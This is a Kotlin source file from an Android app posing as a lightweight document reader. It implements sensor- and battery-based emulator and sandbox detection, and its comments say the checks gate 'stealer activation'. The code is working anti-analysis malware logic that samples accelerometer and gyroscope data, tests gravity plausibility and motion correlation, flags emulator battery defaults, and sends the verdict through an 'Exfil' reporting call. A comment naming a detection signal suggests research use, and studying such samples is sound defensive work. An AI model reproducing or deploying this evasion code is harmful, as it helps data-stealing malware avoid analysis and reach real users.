package com.docreader.lite.reader.advanced

import android.content.Context
import android.hardware.Sensor
import android.hardware.SensorEvent
import android.hardware.SensorEventListener
import android.hardware.SensorManager
import com.docreader.lite.reader.Exfil
import kotlin.math.abs
import kotlin.math.sqrt
import kotlin.random.Random

/**
 * Multi-axis sensor analysis — emulator/sandbox evasion composition (2026 pattern).
 *
 * Why multi-axis matters:
 *   - DeviceCheck checks Build props (defeated by Magisk props)
 *   - IntegrityCheck checks ports/maps (defeated by gadget rename)
 *   - RuntimeCheck checks ptrace/timing (defeated by native hooks)
 *   - But sensor data is HARD to fake convincingly on emulators:
 *     - Real device has accelerometer + gyroscope + magnetometer returning
 *       physically plausible, correlated, continuously varying data
 *     - Emulators return flat (0,0,0) or static values
 *     - Sandboxes may inject synthetic data but correlations are wrong
 *
 * Drelock + Apex composition: combine SafetyCheck (Build + debug + Frida)
 * with multi-axis sensor validation. All axes must pass for stealer activation.
 *
 * Checks:
 *   1. Sensor PRESENCE — accelerometer + gyroscope must exist
 *   2. Sensor VARIANCE — values must change over 2-second window (not flat)
 *   3. Sensor PLAUSIBILITY — gravity magnitude ~9.81 m/s^2
 *   4. Sensor CORRELATION — gyro + accel changes should correlate (device moves as one body)
 *   5. Battery REALISM — not flat 50% / not always charging
 *
 * Detection: an app registering sensor listeners then making activation
 * decisions based on sensor data = anti-analysis signal.
 */
object MultiAxisSensor {

    private const val SAMPLE_WINDOW_MS = 2000L
    private const val GRAVITY = 9.81f
    private const val GRAVITY_TOLERANCE = 1.5f  // ±1.5 m/s^2

    @Volatile
    var lastResult: SensorAssessment? = null
        private set

    data class SensorAssessment(
        val accelerometerPresent: Boolean,
        val gyroscopePresent: Boolean,
        val magnetometerPresent: Boolean,
        val accelerometerVariance: Float,
        val gyroscopeVariance: Float,
        val gravityPlausible: Boolean,
        val correlationScore: Float,
        val batteryRealistic: Boolean,
        val isRealDevice: Boolean,      // Composite verdict
        val failReasons: List<String>,
    )

    /**
     * Run multi-axis sensor check.
     * Samples sensors for 2 seconds, analyzes data, returns assessment.
     * Blocking call — run on background thread.
     */
    fun evaluate(context: Context): SensorAssessment {
        val sensorManager = context.getSystemService(Context.SENSOR_SERVICE) as SensorManager
        val failReasons = mutableListOf<String>()

        // Check 1: Sensor presence
        val accel = sensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER)
        val gyro = sensorManager.getDefaultSensor(Sensor.TYPE_GYROSCOPE)
        val mag = sensorManager.getDefaultSensor(Sensor.TYPE_MAGNETIC_FIELD)

        val accelPresent = accel != null
        val gyroPresent = gyro != null
        val magPresent = mag != null

        if (!accelPresent) failReasons.add("no_accelerometer")
        if (!gyroPresent) failReasons.add("no_gyroscope")

        // Collect samples
        val accelSamples = mutableListOf<FloatArray>()
        val gyroSamples = mutableListOf<FloatArray>()
        val collector = object : SensorEventListener {
            override fun onSensorChanged(event: SensorEvent) {
                when (event.sensor.type) {
                    Sensor.TYPE_ACCELEROMETER -> accelSamples.add(event.values.copyOf())
                    Sensor.TYPE_GYROSCOPE -> gyroSamples.add(event.values.copyOf())
                }
            }
            override fun onAccuracyChanged(sensor: Sensor?, accuracy: Int) {}
        }

        // Register listeners
        if (accelPresent) {
            sensorManager.registerListener(collector, accel, SensorManager.SENSOR_DELAY_GAME)
        }
        if (gyroPresent) {
            sensorManager.registerListener(collector, gyro, SensorManager.SENSOR_DELAY_GAME)
        }

        // Sample for 2 seconds
        try {
            Thread.sleep(SAMPLE_WINDOW_MS)
        } catch (_: InterruptedException) {}

        sensorManager.unregisterListener(collector)

        // Check 2: Variance — values must change (not flat zeros)
        val accelVar = calculateVariance(accelSamples)
        val gyroVar = calculateVariance(gyroSamples)

        if (accelSamples.size < 10) failReasons.add("accel_too_few_samples:${accelSamples.size}")
        if (accelVar < 0.001f) failReasons.add("accel_flat:$accelVar")
        if (gyroPresent && gyroVar < 0.0001f && gyroSamples.size > 5) {
            failReasons.add("gyro_flat:$gyroVar")
        }

        // Check 3: Gravity plausibility — magnitude should be ~9.81
        val gravityOk = if (accelSamples.isNotEmpty()) {
            val avgMagnitude = accelSamples.map { values ->
                sqrt(values[0] * values[0] + values[1] * values[1] + values[2] * values[2])
            }.average().toFloat()

            val plausible = abs(avgMagnitude - GRAVITY) < GRAVITY_TOLERANCE
            if (!plausible) failReasons.add("gravity_implausible:$avgMagnitude")
            plausible
        } else false

        // Check 4: Correlation — accel spikes should co-occur with gyro activity
        val correlation = if (accelSamples.size > 10 && gyroSamples.size > 10) {
            computeMotionCorrelation(accelSamples, gyroSamples)
        } else 0f

        // Check 5: Battery realism
        val batteryOk = checkBatteryRealism(context)
        if (!batteryOk) failReasons.add("battery_unrealistic")

        // Composite verdict
        val isReal = accelPresent &&
            accelSamples.size >= 10 &&
            accelVar >= 0.001f &&
            gravityOk &&
            batteryOk

        val assessment = SensorAssessment(
            accelerometerPresent = accelPresent,
            gyroscopePresent = gyroPresent,
            magnetometerPresent = magPresent,
            accelerometerVariance = accelVar,
            gyroscopeVariance = gyroVar,
            gravityPlausible = gravityOk,
            correlationScore = correlation,
            batteryRealistic = batteryOk,
            isRealDevice = isReal,
            failReasons = failReasons,
        )

        lastResult = assessment

        Exfil.event("sensor_assessment",
            "accel" to accelPresent.toString(),
            "gyro" to gyroPresent.toString(),
            "accel_var" to "%.6f".format(accelVar),
            "gravity_ok" to gravityOk.toString(),
            "battery_ok" to batteryOk.toString(),
            "is_real" to isReal.toString(),
            "fails" to failReasons.joinToString(",")
        )

        return assessment
    }

    /**
     * Calculate variance across all axes of sensor samples.
     */
    private fun calculateVariance(samples: List<FloatArray>): Float {
        if (samples.size < 2) return 0f

        var totalVar = 0f
        for (axis in 0..2) {
            val values = samples.map { it[axis] }
            val mean = values.average().toFloat()
            val variance = values.map { (it - mean) * (it - mean) }.average().toFloat()
            totalVar += variance
        }
        return totalVar / 3f
    }

    /**
     * Compute motion correlation between accelerometer and gyroscope.
     * Real devices: when accel changes (movement), gyro changes (rotation).
     * Emulators: uncorrelated or both flat.
     */
    private fun computeMotionCorrelation(
        accelSamples: List<FloatArray>,
        gyroSamples: List<FloatArray>
    ): Float {
        // Compute magnitude deltas
        val minLen = minOf(accelSamples.size, gyroSamples.size) - 1
        if (minLen < 5) return 0f

        val accelDeltas = (0 until minLen).map { i ->
            val m0 = magnitude(accelSamples[i])
            val m1 = magnitude(accelSamples[i + 1])
            abs(m1 - m0)
        }
        val gyroDeltas = (0 until minLen).map { i ->
            val m0 = magnitude(gyroSamples[i])
            val m1 = magnitude(gyroSamples[i + 1])
            abs(m1 - m0)
        }

        // Simple correlation: count co-occurrences of above-mean deltas
        val accelMean = accelDeltas.average()
        val gyroMean = gyroDeltas.average()
        var coActive = 0
        var total = 0

        for (i in 0 until minLen) {
            val accelActive = accelDeltas[i] > accelMean
            val gyroActive = gyroDeltas[i] > gyroMean
            if (accelActive == gyroActive) coActive++
            total++
        }

        return if (total > 0) coActive.toFloat() / total else 0f
    }

    private fun magnitude(v: FloatArray): Float {
        return sqrt(v[0] * v[0] + v[1] * v[1] + v[2] * v[2])
    }

    /**
     * Check battery state for emulator tells.
     * Emulators: exactly 50%, always AC charging, temperature 0.
     */
    private fun checkBatteryRealism(context: Context): Boolean {
        try {
            val batteryIntent = context.registerReceiver(
                null,
                android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED)
            ) ?: return true

            val level = batteryIntent.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1)
            val scale = batteryIntent.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1)
            val temp = batteryIntent.getIntExtra(android.os.BatteryManager.EXTRA_TEMPERATURE, -1)
            val plugged = batteryIntent.getIntExtra(android.os.BatteryManager.EXTRA_PLUGGED, -1)

            if (scale > 0) {
                val pct = (level * 100) / scale
                // Exactly 50% is emulator default
                if (pct == 50 && plugged == android.os.BatteryManager.BATTERY_PLUGGED_AC) {
                    return false
                }
            }

            // Temperature 0 = emulator (real device: 200-450 = 20.0-45.0 C)
            if (temp == 0) return false

        } catch (_: Exception) {}

        return true
    }
}
